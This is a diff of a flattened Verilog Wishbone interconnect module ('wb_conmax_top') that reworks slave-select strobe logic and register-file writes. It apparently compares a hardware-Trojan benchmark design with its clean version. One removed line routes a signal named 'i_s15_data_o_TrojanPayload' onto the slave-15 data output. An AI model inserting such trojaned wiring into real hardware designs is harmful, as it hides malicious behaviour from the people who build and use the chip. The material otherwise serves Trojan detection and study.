-    always @ (  ( ( ( s13_pri_sel == 2'd0 ) ) ? ( s13_arb_state ) : ( ( ( ( s13_msel_pri_sel == 2'd0 ) ) ? ( s13_msel_arb0_state ) : ( ( ( ( s13_msel_pri_sel == 2'd1 ) ) ? ( s13_msel_sel1 ) : ( s13_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd13 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd13 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd13 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd13 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd13 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd13 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd13 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd13 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s13_pri_sel == 2'd0 ) ) ? ( s13_arb_state ) : ( ( ( ( s13_msel_pri_sel == 2'd0 ) ) ? ( s13_msel_arb0_state ) : ( ( ( ( s13_msel_pri_sel == 2'd1 ) ) ? ( s13_msel_sel1 ) : ( s13_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd13 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd13 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd13 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd13 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd13 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd13 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd13 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd13 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s13_pri_sel == 2'd0 ) ) ? ( s13_arb_state ) : ( ( ( ( s13_msel_pri_sel == 2'd0 ) ) ? ( s13_msel_arb0_state ) : ( ( ( ( s13_msel_pri_sel == 2'd1 ) ) ? ( s13_msel_sel1 ) : ( s13_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s13_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd13 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s13_wb_stb_o = ( ( ( m0_slv_sel == 4'd13 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s13_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd13 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s13_wb_stb_o = ( ( ( m1_slv_sel == 4'd13 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s13_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd13 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s13_wb_stb_o = ( ( ( m2_slv_sel == 4'd13 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s13_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd13 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s13_wb_stb_o = ( ( ( m3_slv_sel == 4'd13 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s13_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd13 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s13_wb_stb_o = ( ( ( m4_slv_sel == 4'd13 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s13_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd13 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s13_wb_stb_o = ( ( ( m5_slv_sel == 4'd13 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s13_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd13 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s13_wb_stb_o = ( ( ( m6_slv_sel == 4'd13 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s13_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd13 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s13_wb_stb_o = ( ( ( m7_slv_sel == 4'd13 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -51104,40 +51176,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s14_pri_sel == 2'd0 ) ) ? ( s14_arb_state ) : ( ( ( ( s14_msel_pri_sel == 2'd0 ) ) ? ( s14_msel_arb0_state ) : ( ( ( ( s14_msel_pri_sel == 2'd1 ) ) ? ( s14_msel_sel1 ) : ( s14_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd14 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd14 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd14 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd14 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd14 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd14 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd14 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd14 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s14_pri_sel == 2'd0 ) ) ? ( s14_arb_state ) : ( ( ( ( s14_msel_pri_sel == 2'd0 ) ) ? ( s14_msel_arb0_state ) : ( ( ( ( s14_msel_pri_sel == 2'd1 ) ) ? ( s14_msel_sel1 ) : ( s14_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd14 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd14 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd14 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd14 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd14 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd14 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd14 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd14 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s14_pri_sel == 2'd0 ) ) ? ( s14_arb_state ) : ( ( ( ( s14_msel_pri_sel == 2'd0 ) ) ? ( s14_msel_arb0_state ) : ( ( ( ( s14_msel_pri_sel == 2'd1 ) ) ? ( s14_msel_sel1 ) : ( s14_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s14_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd14 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s14_wb_stb_o = ( ( ( m0_slv_sel == 4'd14 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s14_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd14 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s14_wb_stb_o = ( ( ( m1_slv_sel == 4'd14 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s14_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd14 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s14_wb_stb_o = ( ( ( m2_slv_sel == 4'd14 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s14_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd14 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s14_wb_stb_o = ( ( ( m3_slv_sel == 4'd14 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s14_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd14 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s14_wb_stb_o = ( ( ( m4_slv_sel == 4'd14 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s14_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd14 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s14_wb_stb_o = ( ( ( m5_slv_sel == 4'd14 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s14_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd14 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s14_wb_stb_o = ( ( ( m6_slv_sel == 4'd14 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s14_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd14 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s14_wb_stb_o = ( ( ( m7_slv_sel == 4'd14 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -54055,40 +54127,40 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  ( ( ( s15_pri_sel == 2'd0 ) ) ? ( s15_arb_state ) : ( ( ( ( s15_msel_pri_sel == 2'd0 ) ) ? ( s15_msel_arb0_state ) : ( ( ( ( s15_msel_pri_sel == 2'd1 ) ) ? ( s15_msel_sel1 ) : ( s15_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd15 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd15 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd15 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd15 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd15 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd15 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd15 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd15 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
+    always @ (  ( ( ( s15_pri_sel == 2'd0 ) ) ? ( s15_arb_state ) : ( ( ( ( s15_msel_pri_sel == 2'd0 ) ) ? ( s15_msel_arb0_state ) : ( ( ( ( s15_msel_pri_sel == 2'd1 ) ) ? ( s15_msel_sel1 ) : ( s15_msel_sel2 ) ) ) ) ) ) or  ( ( ( m0_slv_sel == 4'd15 ) ) ? ( m0_stb_i ) : ( 1'b0 ) ) or  ( ( ( m1_slv_sel == 4'd15 ) ) ? ( m1_stb_i ) : ( 1'b0 ) ) or  ( ( ( m2_slv_sel == 4'd15 ) ) ? ( m2_stb_i ) : ( 1'b0 ) ) or  ( ( ( m3_slv_sel == 4'd15 ) ) ? ( m3_stb_i ) : ( 1'b0 ) ) or  ( ( ( m4_slv_sel == 4'd15 ) ) ? ( m4_stb_i ) : ( 1'b0 ) ) or  ( ( ( m5_slv_sel == 4'd15 ) ) ? ( m5_stb_i ) : ( 1'b0 ) ) or  ( ( ( m6_slv_sel == 4'd15 ) ) ? ( m6_stb_i ) : ( 1'b0 ) ) or  ( ( ( m7_slv_sel == 4'd15 ) ) ? ( m7_stb_i ) : ( 1'b0 ) ))
     begin
         case ( ( ( ( s15_pri_sel == 2'd0 ) ) ? ( s15_arb_state ) : ( ( ( ( s15_msel_pri_sel == 2'd0 ) ) ? ( s15_msel_arb0_state ) : ( ( ( ( s15_msel_pri_sel == 2'd1 ) ) ? ( s15_msel_sel1 ) : ( s15_msel_sel2 ) ) ) ) ) ) ) 
         3'd0:
         begin
-            s15_wb_stb_o = ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd15 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
+            s15_wb_stb_o = ( ( ( m0_slv_sel == 4'd15 ) ) ? ( m0_stb_i ) : ( 1'b0 ) );
         end
         3'd1:
         begin
-            s15_wb_stb_o = ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd15 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
+            s15_wb_stb_o = ( ( ( m1_slv_sel == 4'd15 ) ) ? ( m1_stb_i ) : ( 1'b0 ) );
         end
         3'd2:
         begin
-            s15_wb_stb_o = ( ( ( m2_addr_i[( m2_aw - 1 ):( m2_aw - 4 )] == 4'd15 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
+            s15_wb_stb_o = ( ( ( m2_slv_sel == 4'd15 ) ) ? ( m2_stb_i ) : ( 1'b0 ) );
         end
         3'd3:
         begin
-            s15_wb_stb_o = ( ( ( m3_addr_i[( m3_aw - 1 ):( m3_aw - 4 )] == 4'd15 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
+            s15_wb_stb_o = ( ( ( m3_slv_sel == 4'd15 ) ) ? ( m3_stb_i ) : ( 1'b0 ) );
         end
         3'd4:
         begin
-            s15_wb_stb_o = ( ( ( m4_addr_i[( m4_aw - 1 ):( m4_aw - 4 )] == 4'd15 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
+            s15_wb_stb_o = ( ( ( m4_slv_sel == 4'd15 ) ) ? ( m4_stb_i ) : ( 1'b0 ) );
         end
         3'd5:
         begin
-            s15_wb_stb_o = ( ( ( m5_addr_i[( m5_aw - 1 ):( m5_aw - 4 )] == 4'd15 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
+            s15_wb_stb_o = ( ( ( m5_slv_sel == 4'd15 ) ) ? ( m5_stb_i ) : ( 1'b0 ) );
         end
         3'd6:
         begin
-            s15_wb_stb_o = ( ( ( m6_addr_i[( m6_aw - 1 ):( m6_aw - 4 )] == 4'd15 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
+            s15_wb_stb_o = ( ( ( m6_slv_sel == 4'd15 ) ) ? ( m6_stb_i ) : ( 1'b0 ) );
         end
         3'd7:
         begin
-            s15_wb_stb_o = ( ( ( m7_addr_i[( m7_aw - 1 ):( m7_aw - 4 )] == 4'd15 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
+            s15_wb_stb_o = ( ( ( m7_slv_sel == 4'd15 ) ) ? ( m7_stb_i ) : ( 1'b0 ) );
         end
         endcase
     end
@@ -54117,7 +54189,7 @@ module wb_conmax_top(
     assign s15_m6_rty_o = ( ( ( ( ( s15_pri_sel == 2'd0 ) ) ? ( s15_arb_state ) : ( ( ( ( s15_msel_pri_sel == 2'd0 ) ) ? ( s15_msel_arb0_state ) : ( ( ( ( s15_msel_pri_sel == 2'd1 ) ) ? ( s15_msel_sel1 ) : ( s15_msel_sel2 ) ) ) ) ) ) == 3'd6 ) & rf_i_wb_rty_o );
     assign s15_m7_rty_o = ( ( ( ( ( s15_pri_sel == 2'd0 ) ) ? ( s15_arb_state ) : ( ( ( ( s15_msel_pri_sel == 2'd0 ) ) ? ( s15_msel_arb0_state ) : ( ( ( ( s15_msel_pri_sel == 2'd1 ) ) ? ( s15_msel_sel1 ) : ( s15_msel_sel2 ) ) ) ) ) ) == 3'd7 ) & rf_i_wb_rty_o );
     assign rf_i_wb_cyc_i = s15_wb_cyc_o;
-    assign s15_data_o = i_s15_data_o_TrojanPayload;
+    assign s15_data_o = s15_wb_data_o;
     assign s15_addr_o = s15_wb_addr_o;
     assign s15_sel_o = s15_wb_sel_o;
     assign s15_we_o = s15_wb_we_o;
@@ -54141,7 +54213,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd0 ) ) 
             begin
-                rf_conf0 <= rf_i_wb_data_i[15:0];
+                rf_conf0 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54155,7 +54227,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd1 ) ) 
             begin
-                rf_conf1 <= rf_i_wb_data_i[15:0];
+                rf_conf1 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54169,7 +54241,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd2 ) ) 
             begin
-                rf_conf2 <= rf_i_wb_data_i[15:0];
+                rf_conf2 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54183,7 +54255,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd3 ) ) 
             begin
-                rf_conf3 <= rf_i_wb_data_i[15:0];
+                rf_conf3 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54197,7 +54269,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd4 ) ) 
             begin
-                rf_conf4 <= rf_i_wb_data_i[15:0];
+                rf_conf4 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54211,7 +54283,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd5 ) ) 
             begin
-                rf_conf5 <= rf_i_wb_data_i[15:0];
+                rf_conf5 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54225,7 +54297,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd6 ) ) 
             begin
-                rf_conf6 <= rf_i_wb_data_i[15:0];
+                rf_conf6 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54239,7 +54311,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd7 ) ) 
             begin
-                rf_conf7 <= rf_i_wb_data_i[15:0];
+                rf_conf7 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54253,7 +54325,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd8 ) ) 
             begin
-                rf_conf8 <= rf_i_wb_data_i[15:0];
+                rf_conf8 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54267,7 +54339,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd9 ) ) 
             begin
-                rf_conf9 <= rf_i_wb_data_i[15:0];
+                rf_conf9 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54281,7 +54353,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd10 ) ) 
             begin
-                rf_conf10 <= rf_i_wb_data_i[15:0];
+                rf_conf10 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54295,7 +54367,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd11 ) ) 
             begin
-                rf_conf11 <= rf_i_wb_data_i[15:0];
+                rf_conf11 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54309,7 +54381,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd12 ) ) 
             begin
-                rf_conf12 <= rf_i_wb_data_i[15:0];
+                rf_conf12 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54323,7 +54395,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd13 ) ) 
             begin
-                rf_conf13 <= rf_i_wb_data_i[15:0];
+                rf_conf13 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54337,7 +54409,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd14 ) ) 
             begin
-                rf_conf14 <= rf_i_wb_data_i[15:0];
+                rf_conf14 <= s15_wb_data_o[15:0];
             end
         end
     end
@@ -54351,7 +54423,7 @@ module wb_conmax_top(
         begin 
             if ( rf_rf_we & ( s15_wb_addr_o[5:2] == 4'd15 ) ) 
             begin
-                rf_conf15 <= rf_i_wb_data_i[15:0];
+                rf_conf15 <= s15_wb_data_o[15:0];
             end
         end
     end
